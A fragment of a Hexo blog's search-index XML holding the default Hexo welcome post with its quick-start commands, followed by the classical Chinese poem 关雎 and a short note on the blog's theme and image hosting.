    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="hljs bash">$ hexo new <span class="hljs-string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="hljs bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="hljs bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="hljs bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><h1 id="《关雎》"><a href="#《关雎》" class="headerlink" title="《关雎》"></a>《关雎》</h1><p>关关雎鸠，在河之洲。<br>窈窕淑女，君子好逑。<br>参差荇菜，左右流之。<br>窈窕淑女，寤寐求之。<br>求之不得，寤寐思服。<br>悠哉悠哉，辗转反侧。<br>参差荇菜，左右采之。<br>窈窕淑女，琴瑟友之。<br>参差荇菜，左右芼之。<br>窈窕淑女，钟鼓乐之。</p><p>本博客使用Hexo，主题为Fluid，图床使用阿里云+Picgo方案</p><p><img src="https://laughing-markdown-pics.oss-cn-shenzhen.aliyuncs.com/20200918172947.jpg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>非技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
